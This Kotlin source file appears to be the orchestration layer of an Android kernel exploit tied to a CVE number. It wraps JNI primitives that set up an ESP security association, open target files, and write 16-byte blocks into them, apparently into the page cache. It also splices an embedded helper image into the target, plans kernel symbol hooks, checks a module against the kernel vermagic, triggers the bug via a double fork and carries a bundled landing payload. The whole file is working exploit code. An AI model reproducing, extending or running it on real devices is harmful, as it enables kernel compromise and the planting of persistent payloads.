package com.ghostlock.app.jni.cve43284

import com.ghostlock.app.core.generated.HookPlanRequest43284
import com.ghostlock.app.core.generated.Init43284
import com.ghostlock.app.core.generated.ModuleCheck43284
import com.ghostlock.app.core.generated.ReadBlock43284
import com.ghostlock.app.core.generated.ResolveTarget43284
import com.ghostlock.app.core.generated.Trigger43284
import com.ghostlock.app.core.generated.Wait43284
import com.ghostlock.app.core.generated.WriteBlock43284

/**
 * 43284 的**上层包装**：拼装、想写什么、写到哪、收尾，都放在这里。
 *
 * 分工（用户裁定 2026-10-15）：
 * - [Native43284] 只是 JNI 接口（每个函数一个设备原语，参数是生成的 DTO）；
 * - 本类承载顺序、条件、循环、镜像切块、目标选择、序号接续与收尾 —— 即「拼装与写目标只在 Kotlin」；
 * - native 里不得新增可放在 Kotlin 的逻辑；若本类做不到，说明**接口能力不足**，改接口（见下）。
 *
 * 已知的接口能力不足（本类的 TODO，改造清单见 docs/analysis/jni-two-backend-plan.md §11.17/§11.19）：
 * 1. 缺句柄式原语：openTarget / connectEsp / makeSurface / makeLanding（现在只能靠 Native43284.resolveTarget 一步到位，
 *    而拼装顺序本该由本类逐步决定）；
 * 2. 缺 landBlock / adoptSequence / nextSequence（现在 writeBlock 一把做完「落块 + 推序号」）；
 * 3. 缺 Access 线：makeAccess / accessInitialize / writeImageVerified / writeHook（现在靠 writeBlock 手写块代替）。
 *
 * @param handle [Native43284.create] 给的会话句柄；本类不负责创建，只负责用与收尾。
 */
class Assembled43284(private val handle: Long) {

    /** 最近一次调用的具名拒绝（空串表示没有）。 */
    var lastRefusal: String = ""
        private set

    /** 最近一次的调用码（与 native 的 CallCode 一致：0 ok、-1 not-ready、-2 bad-parameters、-3 unsupported、-4 failed、-5 stale-handle、-8 inflight、-9 closed）。 */
    var lastCode: Int = 0
        private set

    private fun refusalSlot(): Array<String> = arrayOf("")

    private fun record(code: Int, refusal: Array<String>): Int {
        lastCode = code
        lastRefusal = refusal[0]
        return code
    }

    /** 建安全关联。参数（SPI/端口/ICV/密钥）由调用方给：本类不猜。 */
    fun initialize(params: Init43284): Int {
        val refusal = refusalSlot()
        return record(Native43284.initialize(handle, params, refusal), refusal)
    }

    /** 开一扇门：载体路径由调用方给，返回票据（0 表示没开成）。 */
    fun openTarget(path: String, role: Int = ROLE_PATCH1): Long {
        val refusal = refusalSlot()
        val out = LongArray(1)
        val code = Native43284.resolveTarget(
            handle,
            ResolveTarget43284(role = role, path = path.toByteArray(), accessMode = 0),
            out,
            refusal,
        )
        record(code, refusal)
        return if (code == 0) out[0] else 0L
    }

    /** 读一块（十六字节）。读不到返回 null（具名原因在 lastRefusal）。 */
    fun readBlock(ticket: Long, offset: Long): ByteArray? {
        val refusal = refusalSlot()
        val out = ByteArray(BLOCK)
        val code = Native43284.readBlock(handle, ReadBlock43284(ticket = ticket, offset = offset), out, refusal)
        record(code, refusal)
        return if (code == 0) out else null
    }

    /** 写一块（十六字节）。成功只到 Dispatched —— 内容是否真的落上由 readBlock 比较判定。 */
    fun writeBlock(ticket: Long, offset: Long, block: ByteArray): Int {
        require(block.size == BLOCK) { "一块就是十六字节" }
        val refusal = refusalSlot()
        return record(
            Native43284.writeBlock(
                handle,
                WriteBlock43284(ticket = ticket, offset = offset, block = block),
                refusal,
            ),
            refusal,
        )
    }

    /** 本构建自带的字节：角色 0 = splice helper，1 = sentry 落地载荷。 */
    fun image(role: Int): ByteArray? {
        val refusal = refusalSlot()
        val bytes = Native43284.embeddedImage(handle, role, refusal)
        record(if (bytes == null) NEGATIVE else 0, refusal)
        return bytes
    }

    /**
     * 把 helper 镜像按十六字节切块写进已开的目标（patch1 的 Kotlin 版）。
     *
     * @return 成功写出的块数；被拒时停下并保留 lastRefusal（剩下的块没写）。
     */
    fun writeHelperImage(ticket: Long, baseOffset: Long = 0L): Int {
        val helper = image(ROLE_IMAGE_SPLICE_HELPER) ?: return 0
        var written = 0
        var offset = 0L
        while (offset < helper.size) {
            val at = offset.toInt()
            val width = minOf(BLOCK, helper.size - at)
            val chunk = helper.copyOfRange(at, at + width).copyOf(BLOCK)
            if (writeBlock(ticket, baseOffset + offset, chunk) != 0) {
                return written
            }
            written += 1
            offset += BLOCK
        }
        return written
    }

    /** 动态钩子计划（符号 + guard 策略 + 镜像）；返回四个数：branch / displaced / site / landing。 */
    fun hookPlan(symbol: String, guardPolicy: Int = 0): LongArray? {
        val refusal = refusalSlot()
        val out = LongArray(4)
        val code = Native43284.hookPlan(
            handle,
            HookPlanRequest43284(ByteArray(BLOCK) { 0x11 }, symbol.toByteArray(), guardPolicy),
            out,
            refusal,
        )
        record(code, refusal)
        return if (code == 0) out else null
    }

    /** 模块校验（镜像字节 + 内核 vermagic 由调用方给）。 */
    fun moduleCheck(image: ByteArray, kernelVermagic: String): Int {
        val refusal = refusalSlot()
        return record(
            Native43284.moduleCheck(
                handle,
                ModuleCheck43284(moduleImage = image, kernelVermagic = kernelVermagic.toByteArray()),
                refusal,
            ),
            refusal,
        )
    }

    /** 触发（双 fork）。 */
    fun trigger(delayMs: Long): Int {
        val refusal = refusalSlot()
        return record(Native43284.trigger(handle, Trigger43284(delayMs), refusal), refusal)
    }

    /** 等终态：0 failure / 1 success / 2 inflight（-1 表示调用本身失败）。 */
    fun waitTerminal(
        budgetMs: Long,
        pollMs: Long,
        successMarker: String,
        failureMarker: String,
        inFlightMarker: String,
        moduleMarker: String,
        moduleName: String,
    ): Long {
        val refusal = refusalSlot()
        val out = LongArray(1) { -1L }
        Native43284.waitTerminal(
            handle,
            Wait43284(
                budgetMs = budgetMs,
                pollMs = pollMs,
                successMarker = successMarker.toByteArray(),
                failureMarker = failureMarker.toByteArray(),
                inFlightMarker = inFlightMarker.toByteArray(),
                moduleMarker = moduleMarker.toByteArray(),
                moduleName = moduleName.toByteArray(),
            ),
            out,
            refusal,
        )
        return out[0]
    }

    /** 收尾：先把会话关掉，再让 native 释放句柄。两次都返回 0 才算干净。 */
    fun close(): Boolean {
        val first = refusalSlot()
        val shutdown = record(Native43284.shutdown(handle, first), first)
        val second = refusalSlot()
        val destroyed = record(Native43284.destroy(handle, second), second)
        return shutdown == 0 && destroyed == 0
    }

    companion object {
        /** 一块十六字节（AES-CBC 一块，也是页缓存写的宽度）。 */
        const val BLOCK = 16

        /** 目标角色（与契约里 ResolveTarget43284.role 的取值一致）。 */
        const val ROLE_PATCH1 = 1
        const val ROLE_CARRIER = 2
        const val ROLE_HOOK = 3
        const val ROLE_REMOTE_BRIDGE = 4

        /** 自带字节的角色。 */
        const val ROLE_IMAGE_SPLICE_HELPER = 0
        const val ROLE_IMAGE_LANDING_PAYLOAD = 1

        /** 调用本身没成功时的占位（不是 native 的调用码）。 */
        private const val NEGATIVE = -1
    }
}
